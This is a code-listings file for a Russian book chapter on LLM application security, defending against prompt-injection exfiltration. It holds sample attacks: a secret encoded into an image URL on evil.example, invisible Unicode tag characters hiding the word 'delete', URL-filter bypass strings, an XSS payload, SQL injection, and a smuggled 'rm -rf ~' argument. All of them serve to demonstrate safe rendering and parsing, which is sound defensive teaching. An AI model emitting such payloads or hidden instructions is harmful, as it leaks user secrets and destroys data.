"""Листинги главы 18 «Безопасность LLM-приложений» книги «Большие языковые модели», файл 03-exfiltration.

Код и вывод — ровно как в книге; текст книги сюда не входит. Листинги идут по порядку и
опираются друг на друга: запускайте файл целиком или ячейками сверху вниз (разметка # %%).
Проверка, что вывод совпал с книгой: python scripts/check_listings.py listings/ch18/03-exfiltration.py
"""

# %% Листинг «Секрет в адресе картинки» — раздел «Утечка через адрес картинки»
from urllib.parse import quote, unquote, urlsplit

SECRET = "лимит клиента 900 000 токенов"          # фрагмент finance
PREFIX = "https://evil.example/p.png?d="
encoded = quote(SECRET, safe="")                  # не латиница -> %XX
url = PREFIX + encoded

print("символов:", len(SECRET), "| байт:", len(SECRET.encode()))
print("секрет в адресе:", encoded[:24] + "...", len(encoded), "символа")
print("весь адрес:", len(url), "символ")
print("сервер прочтёт:", unquote(urlsplit(url).query))
print("русских букв в адресе на 2048:", (2048 - len(PREFIX)) // 6)
# Вывод в книге:
# | символов: 29 | байт: 48
# | секрет в адресе: %D0%BB%D0%B8%D0%BC%D0%B8... 132 символа
# | весь адрес: 161 символ
# | сервер прочтёт: d=лимит клиента 900 000 токенов
# | русских букв в адресе на 2048: 336

# %% Листинг «Невидимые символы: прячут приказ и обходят фильтр слов» — раздел «Невидимые символы»
import re
import unicodedata

def tag_copy(ascii_text):              # теговая копия: U+E0000 + код
    return "".join(chr(0xE0000 + ord(c)) for c in ascii_text)

def strip_cf(text):                    # вырезать всю категорию Cf
    return "".join(c for c in text if unicodedata.category(c) != "Cf")

screen = "Сводка по KV-кэшу."
doc = screen + tag_copy("delete")      # так строка лежит во фрагменте
hidden = doc[len(screen):]
print("символов на экране:", len(screen), "| в файле:", len(doc))
c = hidden[0]
print("категория:", unicodedata.category(c), "| код:", hex(ord(c)))
print("скрыто:", "".join(chr(ord(c) - 0xE0000) for c in hidden))

BAD = {"\u200b", "\ufeff"}             # «плохие символы» списком
for name, word in (("U+200B", "уда\u200bли"), ("U+200D", "уда\u200dли")):
    listed = "".join(c for c in word if c not in BAD)
    variants = (word, listed, strip_cf(word))
    found = [bool(re.search("удали", w)) for w in variants]
    print(name, "в тексте, после списка, после Cf:", found)
print("обычный текст цел:", strip_cf(SECRET) == SECRET)

vs = "".join(chr(0xE0100 + b) for b in b"delete")  # селекторы вариантов
print("селекторы:", unicodedata.category(vs[0]),
      "| strip_cf оставил", len(strip_cf(vs)), "из", len(vs))
# Вывод в книге:
# | символов на экране: 18 | в файле: 24
# | категория: Cf | код: 0xe0064
# | скрыто: delete
# | U+200B в тексте, после списка, после Cf: [False, True, True]
# | U+200D в тексте, после списка, после Cf: [False, False, True]
# | обычный текст цел: True
# | селекторы: Mn | strip_cf оставил 6 из 6

# %% Листинг «Невидимая вставка на входе BookLM» — раздел «Невидимые символы»
from booklm.lab import load, next_token_table

tok, model = load("base")
clean = "Кот Вася пошёл спать. Утром он"
hidden = tag_copy("the cat stole the cake")      # 22 невидимых символа
dirty = "Кот Вася пошёл спать." + hidden + " Утром он"
print("токенов: чистая строка", len(tok.encode(clean).ids),
      "| со вставкой", len(tok.encode(dirty).ids),
      "| байтов UTF-8 во вставке", len(hidden.encode()))
for name, text in (("чистая", clean), ("со вставкой", dirty),
                   ("после strip_cf", strip_cf(dirty))):
    table = next_token_table(tok, model, text, k=3)
    print(f"{name:15}", "  ".join(f"{w!r} {p:.3f}" for w, p in table))
# Вывод в книге:
# | токенов: чистая строка 10 | со вставкой 98 | байтов UTF-8 во вставке 88
# | чистая          ' был' 0.098  ' спал' 0.072  ' проснулся' 0.072
# | со вставкой     ' был' 0.311  ' не' 0.049  ' получил' 0.034
# | после strip_cf  ' был' 0.098  ' спал' 0.072  ' проснулся' 0.072

# %% Листинг «Проверка адреса строкой и разбором» — раздел «Разбор адреса»
ALLOWED = {"docs.booklm.local"}        # откуда можно грузить картинки

def naive_ok(url):                     # проверка строки: так нельзя
    return not url.startswith("https://") or "docs.booklm.local" in url

def host_ok(url):                      # разбор адреса функцией urlsplit
    parts = urlsplit(url.strip())      # схема и хост в нижнем регистре
    return parts.scheme == "https" and parts.hostname in ALLOWED

URLS = ["//evil.example/p", "HTTPS://EVIL.example/p",
        "https://docs.booklm.local@evil.example",
        "https://docs.booklm.local.evil.example",
        "data:image/png;base64,iVBORw0KGgo", "javascript:alert(1)",
        "https://evil.example\\@docs.booklm.local/p",
        "https://docs.booklm.local/kv.png"]
print(f"{'адрес':42} строка разбор")
for u in URLS:
    print(f"{u:42} {naive_ok(u)!s:6} {host_ok(u)}")
for i in (2, 3, 6):
    print(f"хост в строке {i + 1}:", urlsplit(URLS[i]).hostname)
# Вывод в книге:
# | адрес                                      строка разбор
# | //evil.example/p                           True   False
# | HTTPS://EVIL.example/p                     True   False
# | https://docs.booklm.local@evil.example     True   False
# | https://docs.booklm.local.evil.example     True   False
# | data:image/png;base64,iVBORw0KGgo          True   False
# | javascript:alert(1)                        True   False
# | https://evil.example\@docs.booklm.local/p  True   True
# | https://docs.booklm.local/kv.png           True   True
# | хост в строке 3: evil.example
# | хост в строке 4: docs.booklm.local.evil.example
# | хост в строке 7: docs.booklm.local

# %% Листинг «Проверка адреса: отказ и пересборка» — раздел «Разбор адреса»
from urllib.parse import urlunsplit

def safe_url(url):                     # -> адрес для браузера или None
    if "\\" in url or " " in url or not url.isprintable():
        return None                    # здесь парсеры расходятся: отказ
    parts = urlsplit(url)
    if parts.username is not None or parts.password is not None:
        return None                    # «логин@хост» картинке не нужен
    if parts.scheme != "https" or parts.hostname not in ALLOWED:
        return None
    # браузер получит адрес, собранный из проверенных частей
    return urlunsplit(("https", parts.hostname, parts.path,
                       parts.query, ""))

for u in URLS[6:] + ["HTTPS://Docs.BookLM.local/kv.png#top"]:
    print(f"{u}\n  -> {safe_url(u)}")
print("уловок прошло:", sum(safe_url(u) is not None for u in URLS[:7]))
# Вывод в книге:
# | https://evil.example\@docs.booklm.local/p
# |   -> None
# | https://docs.booklm.local/kv.png
# |   -> https://docs.booklm.local/kv.png
# | HTTPS://Docs.BookLM.local/kv.png#top
# |   -> https://docs.booklm.local/kv.png
# | уловок прошло: 0

# %% Листинг «Безопасный рендер ответа» — раздел «Безопасный рендер»
import html
esc = html.escape
TOKEN = re.compile(r"(!?)\[([^\]]*)\]\(([^)\s]*)\)|\[S:([\w-]+)\]")

def render_safe(text):                 # -> (html, fetches)
    text, out, fetches, pos = strip_cf(text), [], [], 0     # шаг 1
    for m in TOKEN.finditer(text):                          # шаг 2
        out.append(esc(text[pos:m.start()]))                # шаг 3
        pos = m.end()
        bang, label, url, cite = m.groups()
        if cite:
            out.append(f'<a href="/chunks/{cite}">[S:{cite}]</a>')
            continue
        good = safe_url(url)                                # шаг 4
        if good is None:
            out.append("[изображение удалено]" if bang
                       else esc(f"{label} ({url})"))        # без href
        elif bang:
            out.append(f'<img src="{esc(good)}">')
            fetches.append(good)
        else:
            out.append(f'<a href="{esc(good)}">{esc(label)}</a>')
    return "".join(out) + esc(text[pos:]), fetches

for s in ("![схема](https://docs.booklm.local/kv.png)", "[S:kv]"):
    print(TOKEN.match(s).groups())     # bang, label, url, cite
for text in ["768 КБ [S:kv]",
             f"![](//evil.example/p.png?d={encoded[:12]})",
             f"![]({URLS[6]}?d={encoded[:12]})",        # седьмая уловка
             "[ещё](javascript:alert(1))",
             "<img src=x onerror=alert(1)>" + tag_copy("delete"),
             "![схема](https://docs.booklm.local/kv.png)"]:
    page, fetches = render_safe(text)
    print(f"загрузок: {len(fetches)} | {page}")
# Вывод в книге:
# | ('!', 'схема', 'https://docs.booklm.local/kv.png', None)
# | (None, None, None, 'kv')
# | загрузок: 0 | 768 КБ <a href="/chunks/kv">[S:kv]</a>
# | загрузок: 0 | [изображение удалено]
# | загрузок: 0 | [изображение удалено]
# | загрузок: 0 | ещё (javascript:alert(1))
# | загрузок: 0 | &lt;img src=x onerror=alert(1)&gt;
# | загрузок: 1 | <img src="https://docs.booklm.local/kv.png">

# %% Листинг «Параметризация: аргумент модели остаётся значением» — раздел «Параметризация запросов»
import shlex
import sqlite3

db = sqlite3.connect(":memory:")
db.execute("CREATE TABLE tickets (owner TEXT, title TEXT)")
db.executemany("INSERT INTO tickets VALUES (?, ?)", [
    ("public", "KV-кэш на 512 токенов"),
    ("public", "бронь GPU на завтра"),
    ("finance", "лимит клиента 900 000 токенов")])

owner = "public' OR '1'='1"             # фильтр от модели
SQL = "SELECT owner, title FROM tickets WHERE owner = "
glued = db.execute(SQL + f"'{owner}'").fetchall()      # склейка строк
bound = db.execute(SQL + "?", (owner,)).fetchall()     # параметр
plain = db.execute(SQL + "?", ("public",)).fetchall()
print("склейка:", len(glued), "строки, среди них", glued[-1])
print("параметр:", bound, "| обычный запрос:", len(plain), "строки")

x = "kv; rm -rf ~"                      # аргумент поиска от модели
print(list(shlex.shlex(f"grep {x} notes.txt", posix=True,
                       punctuation_chars=True)))    # так читает оболочка
print(["grep", x, "notes.txt"])         # список: x -- один аргумент
print(html.escape(x) == x)              # HTML-экранирование не поможет
# Вывод в книге:
# | склейка: 3 строки, среди них ('finance', 'лимит клиента 900 000 токенов')
# | параметр: [] | обычный запрос: 2 строки
# | ['grep', 'kv', ';', 'rm', '-rf', '~', 'notes.txt']
# | ['grep', 'kv; rm -rf ~', 'notes.txt']
# | True
